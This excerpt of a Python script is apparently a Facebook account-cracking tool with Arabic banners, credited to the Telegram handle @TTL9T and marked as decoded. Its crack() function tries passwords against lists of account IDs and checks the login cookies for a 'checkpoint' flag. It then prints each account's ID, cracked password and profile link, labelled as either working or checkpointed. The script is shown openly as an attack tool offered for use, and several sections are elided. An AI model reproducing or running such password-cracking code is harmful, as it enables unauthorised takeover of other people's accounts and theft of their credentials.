...
output = render('qgq.t', colors=['blue', 'red'], align='center')
print(output)
print(' نورت الاداة ييروح  🥺🤎. ')
print(' اهلا بك في ادات صيد فيسبوك عن طريق الايدي 👽💀')
print(' @TTL9T ')
...
def menu(my_name,my_id):
    ...
    print('')
    print(f'''\x1b[1;34m\n
للشتـراك ويا المطـور 💎  @TTL9T
''')
#    print(f'ادات صيد حسابات فيس عبر الايديات مدفوعه - الحقوق والمصدر 😈 || @')
    print(''''
...
def crack(idf,pwv):
    ...
    fff = '%'
    print('\r%s [دتفحص💀🔥] %s/%s  ◠‿◕  [شغال] %s ◠‿◕ [سكيور] %s ◠‿◕ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
        ...
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                if 'ya' in oprek:
                    ...
                    print('\n')
                    statuscp = f'''DECODE BY DEMO | @TTL9T
                    ليس شغال 💀💔
لاتنسئ صور صيد 🙈
━━━━━━━━⚚𝐒𝐀𝐖𝐀𝐃⚚━━━━━━━━━━━━━━
جميل 👤 - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
...
━━━━━━━━⚚𝐒𝐀𝐖𝐀𝐃⚚━━━━━━━━━━━━━━
 🤪 @TTL9T                    
                ...
                if 'no' in taplikasi:
                    ...
                    print('\n')
                    statusok = f'''DECODE BY DEMO | @TTL9T
                    شغـال 🔥🥶 لاتنسئ صور صيد 🙈
━━━━━━━━━⚚𝐒𝐀𝐖𝐀𝐃⚚━━━━━━━━━━━━━━━
👤 - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
✏️ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
━━━━━━━━⚚𝐒𝐀𝐖𝐀𝐃⚚━━━━━━━━━━━━━━
⚚𝐒𝐀𝐖𝐀𝐃⚚​​​​​ : https://www.facebook.com/profile.php?id={idf}
 ...
 💃🏽 @TTL9T    
                    ...
                    infoakun += f'''DECODE BY DEMO | @TTL9T
                    شغـال 🥶🔥
━━━━━━━━⚚𝐒𝐀𝐖𝐀𝐃⚚━━━━━━━━━━━━━━━━━━━━━                     
